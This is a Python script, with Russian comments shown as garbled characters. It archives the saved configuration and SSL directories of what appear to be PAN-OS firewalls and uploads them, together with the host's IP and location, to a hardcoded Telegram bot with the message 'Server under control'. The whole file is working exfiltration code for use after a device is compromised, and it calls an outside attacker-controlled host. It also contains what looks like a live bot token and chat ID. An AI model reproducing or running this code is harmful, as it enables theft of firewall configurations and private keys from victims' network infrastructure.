import subprocess
import importlib
import sys
import hashlib
import os
import io
import tarfile

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫
def check_and_install_libraries():
    required_libraries = ["requests", "urllib3"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ {lib} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞, —É—Å—Ç–∞–Ω–æ–≤–∫–∞...")
            install_package(lib)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫ –ø–µ—Ä–µ–¥ –∏–º–ø–æ—Ä—Ç–æ–º
check_and_install_libraries()

# –ò–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫ –ø–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏
import requests
import urllib3

# –û—Ç–∫–ª—é—á–µ–Ω–∏–µ SSL-–ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–π
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –∏ —Ñ–∞–π–ª–æ–≤ –≤ Telegram
def send_to_telegram(message, files):
    tg_bot_token = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc"
    tg_chat_id = "-1002403648422"
    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"

    multipart_data = {"chat_id": (None, tg_chat_id), "text": (None, message)}
    for file_name, file_data in files.items():
        multipart_data[file_name] = (file_name, file_data, "application/x-tar")

    response = requests.post(
        url.replace("sendMessage", "sendDocument"), files=multipart_data, verify=False
    )
    return response.ok

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –≤ –ø–∞–º—è—Ç—å
def archive_directory(directory_path):
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        tar.add(directory_path, arcname=os.path.basename(directory_path))
    tar_stream.seek(0)
    return tar_stream

# –û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å
def main():
    try:
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–µ—Ä–≤–µ—Ä–µ
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ö–µ—à –∏–∑ IP
        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
        message = f"üü¢ –°–µ—Ä–≤–µ—Ä –ø–æ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"–°—Ç—Ä–∞–Ω–∞: {country}\n"
        message += f"–ì–æ—Ä–æ–¥: {city}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"  # –•–µ—à –∏–∑ –ø–µ—Ä–≤—ã—Ö 8 —Å–∏–º–≤–æ–ª–æ–≤

        # –ê—Ä—Ö–∏–≤–∞—Ü–∏—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
        files = {
            "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
            "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
        }

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ —Ñ–∞–π–ª—ã –≤ Telegram
        if send_to_telegram(message, files):
            print("–°–æ–æ–±—â–µ–Ω–∏–µ –∏ —Ñ–∞–π–ª—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!")
        else:
            print("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –∏ —Ñ–∞–π–ª–æ–≤.")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞: {e}")

if __name__ == "__main__":
    main()
